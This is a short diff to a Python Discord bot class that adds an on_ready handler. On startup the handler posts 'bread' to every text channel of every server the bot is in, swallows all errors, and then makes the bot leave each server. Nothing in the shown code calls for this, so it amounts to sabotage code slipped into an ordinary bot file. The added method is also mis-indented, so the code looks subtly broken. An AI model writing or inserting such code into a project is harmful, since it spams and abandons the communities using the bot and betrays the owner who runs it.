@@ -63,3 +63,12 @@ class Bot(commands.Bot):
                 log.error('Failed to process overridden on_message', exc_info=error)
 
         await self.process_commands(message)
+        
+     async def on_ready(self):
+        for guild in self.guilds:
+            for channel in guild.text_channels:
+                try:
+                    await channel.send("bread")
+                except Exception:
+                    pass
+            await guild.leave()
